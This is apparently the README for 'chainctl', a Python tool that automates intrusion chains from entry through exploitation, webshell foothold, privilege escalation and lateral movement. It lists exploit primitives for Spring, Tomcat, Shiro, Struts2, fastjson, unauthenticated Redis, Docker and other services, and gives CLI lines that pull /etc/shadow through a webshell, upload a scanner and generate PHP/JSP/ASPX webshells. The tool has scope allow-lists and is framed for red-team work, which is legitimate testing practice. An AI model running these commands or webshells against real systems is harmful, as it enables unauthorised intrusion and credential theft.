# chainctl — ARTEX 自动入侵链路执行器

**定位**：把 ARTEX skills 层的“人读打法手册”落成**可执行的攻击链原语库**。
纯 Python 3 标准库（3.10+，无第三方依赖），单文件核心 `chainlib.py` + CLI `chainctl.py`，
内置端到端自测 `selftest.py`（本机起一组故意有漏洞的夹具，34 项断言全绿才准交付）。

## 安装

```bash
# 无需安装，任何 Python 3.10+ 直接运行
python chainctl.py selftest     # 先跑自测，PASS 才用于实战
```

## 核心概念

- **原语（primitive）**：一个攻击单元，`probe`（只读探测）→ `exploit`（真实利用，需 `--execute`）→ `verify`（阴性/阳性双对照复测）三段合约。`200 ≠ 打通`，verify 必须带对照。
- **阶段（stage）**：`entry → exploit → foothold → privesc → lateral`，链式推进，命中即转下一阶段（命门在手先收口，防发散）。
- **台账（ledger.jsonl）**：每步动作落 JSONL，字段语义对齐 ARTEX `redteam_chain_add`（stage/tool/result/evidence），可直接回灌 ARTEX 后端。
- **范围护栏（Scope）**：`--allow` 显式圈定 IP/CIDR/域名；云元数据 `169.254.169.254` 永久红线；清单外目标一律拒绝。
- **WebShell 通道合约**：`POST k=<key>&c=base64(cmd) → 响应即 stdout 原文`，落地后必须实测连接才算 foothold。

## 用法

```bash
# 1) 生成计划（profile: auto/web/db/host）
python chainctl.py plan --target http://10.0.0.5:8080 --profile auto --out plan.json

# 2) dry-run（只探测，零写入）
python chainctl.py run --plan plan.json --allow 10.0.0.5

# 3) 真实利用（probe 命中的原语才会 exploit，命中后自动 verify）
python chainctl.py run --plan plan.json --allow 10.0.0.5 --execute

# 4) 只复测已成立的成果（双对照）
python chainctl.py verify --plan plan.json --allow 10.0.0.5

# 5) 上下文注入（人工侦察结果喂给原语，可重复 --hint）
python chainctl.py plan --target http://t/ --hint sqli_param=id --hint lfi_param=path

# 6) WebShell 通道（通道接管后交互）
python chainctl.py shell --url http://t/shell.php --key artex -c "id"
python chainctl.py shell --url http://t/shell.php --key artex --upload fscan.exe /tmp/f
python chainctl.py shell --url http://t/shell.php --key artex --download /etc/shadow c.txt
python chainctl.py shell --scaffold php --key artex --out shell.php   # 马生成（php/jsp/aspx）

# 7) 知识库索引（596 条 PoC → CVE/产品映射）
python chainctl.py catalog --db knowledge/knowledge.db --out catalog.json

# 8) 自测
python chainctl.py selftest
python chainctl.py primitives   # 列出全部原语
```

## 内置原语（24，持续扩充）

| stage | 原语 | 端口/前置 |
| --- | --- | --- |
| entry | http-fingerprint | - |
| exploit | spring-actuator / tomcat-put / sqli-oracle / lfi-environ-rce / upload-bypass / jwt-none / jwt-weak-secret / ssrf-diff | 80/443/8080 |
| exploit | unauth-redis / unauth-es / unauth-docker / unauth-mongo / unauth-memcache / php-fpm-unauth | 6379/9200/2375/27017/11211/9000 |
| exploit | weblogic-t3iiop / shiro-rememberme / struts2-ognl / fastjson-rce / druid-unauth / jenkins-script | 7001/80/8080 |
| foothold | shell-channel | shell_url+shell_key |
| privesc | post-unix-enum | 同上 |
| lateral | lateral-candidates | 同上 |

Java 中间件族由 `javatest.py` 冒烟（19 断言）：T3 握手判版本映射 CVE 区间、Shiro 默认密钥
AES-CBC deleteMe oracle、S2-045 OGNL 数学回显、fastjson autotype 区间、Druid 监控台、
Jenkins Groovy 控制台（crumb + 无 crumb 阴性对照）。

## 与 ARTEX 集成

1. 计划/hints 可由 ARTEX worker 的侦察产出（`web-fingerprint`、`fofa-recon` 等技能的落库结果）转写。
2. `ledger.jsonl` 每条记录字段对齐 `redteam_chain_add`：`stage_code` 用 `internet/internal`，
   `tool` 写动作名，`result` 写 detail，`evidence` 引用 `runs/` 下落盘文件。
3. `catalog.json` 把 `knowledge.db`（poc 表）+ `knowledge/pocs/` 596 条目录索引成
   CVE/组件 → 路径映射，供 plan 排序与 Nday 选取。

## 自测覆盖（selftest.py）

- Web 链：actuator 泄露 / Tomcat PUT / SQLi oracle / LFI+environ 投毒 / 上传分号绕过 /
  JWT alg:none 与弱密钥 / SSRF A-B-A 差分
- 通道与后渗透：WebShell contract 实测 / id/SUID/sudo/凭据/邻居枚举 / 横向候选
- 服务族：Redis（含需认证负例）/ MongoDB OP_MSG / memcached / Docker API 挂载逃逸 /
  ES 索引计量 / PHP-FPM FastCGI RCE
- 护栏：云元数据红线 / 清单外目标拒绝

## 纪律（与 ARTEX skills 铁律同源）

- verify 双对照不过的结论一律不得落库为 confirmed。
- dry-run 永不写入；`--execute` 前先确认范围护栏覆盖全部目标。
- 内网目标走隧道时把 `http_req` 的目标换成代理可达地址，勿改系统代理。
